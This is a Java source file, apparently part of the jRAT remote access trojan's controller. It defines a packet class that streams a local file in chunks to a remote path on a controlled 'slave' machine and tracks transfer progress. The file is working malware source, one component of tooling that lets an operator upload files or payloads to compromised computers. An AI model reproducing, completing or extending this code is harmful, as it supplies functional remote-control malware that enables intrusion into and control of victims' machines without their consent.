package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameFileTransfer;


public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	private File file;
	private String remoteFile;
	
	public Packet42ServerUploadFile(File file, String remoteFile) {
		this.file = file;
		this.remoteFile = remoteFile;
	}

	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(remoteFile);
		
		if (file.exists() && file.isFile()) {
			new Thread(new Runnable() {
				public void run() {
					try {
						slave.addToSendQueue(new Packet102BeginServerUpload(file, remoteFile));

						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 8];

						for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
							int read = fileInput.read(chunk);
							
							slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
							

							final FrameFileTransfer frame = FrameFileTransfer.instance;
							
							int p = pos > file.length() ?  (int) file.length() : (int) pos;
							frame.reportProgress(remoteFile, (int) ((float) p / (float) file.length() * 100.0F), p, (int) file.length());
						}
						fileInput.close();
						
						slave.addToSendQueue(new Packet103CompleteServerUpload(remoteFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}).start();
		}
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
